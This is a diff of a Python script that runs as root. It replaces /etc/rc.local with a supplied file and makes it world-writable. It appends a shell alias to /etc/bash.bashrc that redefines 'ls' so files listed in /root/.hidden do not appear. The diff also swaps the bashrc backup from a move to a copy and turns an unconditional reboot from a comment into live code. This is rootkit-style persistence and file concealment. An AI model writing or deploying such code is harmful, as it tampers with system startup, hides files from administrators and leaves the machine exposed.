@@ -37,13 +37,9 @@ os.system("mv /etc/rc.local /etc/rc.local.bkp")
 os.system("cp rc.local.grp /etc/rc.local")
 os.system( "chmod 777 /etc/rc.local")
 
-os.system("mv  /etc/bash.bashrc /etc/bash.bashrc.bkp")
+os.system("cp  /etc/bash.bashrc /etc/bash.bashrc.bkp")
 file = open("/etc/bash.bashrc","a")
 file.write( "alias ls=\"export GLOBIGNORE_TMP=$GLOBIGNORE; export GLOBIGNORE=$GLOBIGNORE:.*:$(tr \'\\n\' \':\' < /root/.hidden); ls -dC * ;export GLOBIGNORE=$GLOBIGNORE_TMP; export GLOBIGNORE_TMP=\'\'\"")
 file.close()
-os.system("clear")
-time.sleep(2)
-
-print "all done"
-#os.system("sudo reboot")
+os.system("sudo reboot")
 
